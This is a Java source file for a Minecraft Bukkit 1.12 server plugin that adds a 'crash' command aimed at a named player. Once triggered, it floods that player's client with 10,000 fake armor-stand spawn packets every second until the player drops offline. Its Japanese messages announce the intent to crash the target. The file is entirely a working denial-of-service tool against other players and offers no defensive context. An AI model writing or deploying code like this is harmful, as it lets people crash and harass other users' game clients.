package koutachan.crashplugin.command;

import koutachan.crashplugin.CrashPlugin;
import net.minecraft.server.v1_12_R1.EntityArmorStand;
import net.minecraft.server.v1_12_R1.PacketPlayOutSpawnEntityLiving;
import net.minecraft.server.v1_12_R1.PlayerConnection;
import net.minecraft.server.v1_12_R1.WorldServer;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_12_R1.CraftWorld;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

public class CrashCommand implements CommandExecutor {

    private final Plugin plugin;

    public CrashCommand(Plugin plugin){
        this.plugin = plugin;

    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 0) {
            sender.sendMessage("プレイヤー名を入力してください");
            return true;
        }
        Player player = Bukkit.getPlayerExact(args[0]);
        if (player == null) {
            sender.sendMessage("プレイヤーがオフラインか入力する名前が間違っています");
            return true;

        }
        if (!CrashPlugin.hashMap.get(player.getUniqueId())) {
            sender.sendMessage(ChatColor.RED + player.getDisplayName() + "をクラッシュさせます！");
            CrashPlugin.hashMap.put(player.getUniqueId(), true);
            new BukkitRunnable() {
                @Override
                public void run() {
                    if (!player.isOnline()) {
                        cancel();
                    }
                    for (int i = 0; i < 10000; i++) {
                        if (!player.isOnline()) {
                            break;
                        }
                        WorldServer world = ((CraftWorld) player.getWorld()).getHandle();
                        EntityArmorStand armorStand = new EntityArmorStand(world, player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ());
                        PlayerConnection connection = ((CraftPlayer) player).getHandle().playerConnection;
                        connection.sendPacket(new PacketPlayOutSpawnEntityLiving(armorStand));
                    }
                }
            }.runTaskTimer(plugin, 0, 20);
        }else{
            sender.sendMessage(ChatColor.RED + player.getDisplayName() + "はすでにクラッシュさせています！");
        }
    return true;
    }
}